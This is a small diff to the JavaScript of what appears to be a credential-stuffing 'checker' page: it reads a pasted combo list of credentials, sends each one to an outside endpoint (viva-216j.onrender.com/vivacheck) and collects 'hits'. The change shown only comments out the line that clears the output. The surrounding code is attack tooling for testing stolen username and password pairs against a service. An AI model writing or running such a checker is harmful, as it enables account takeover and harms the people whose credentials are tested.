@@ -5,7 +5,7 @@ document.addEventListener('DOMContentLoaded', function () {
         const comboList = document.getElementById('comboList').value;
         const credentials = comboList.split('\n');
         let hitsOutput = document.getElementById('hitsOutput');
-        hitsOutput.innerHTML = '';
+        //hitsOutput.innerHTML = '';
 
         try {
             const requests = credentials.map(cred => axios.get(`https://viva-216j.onrender.com/vivacheck?creds=${encodeURIComponent(cred)}`));
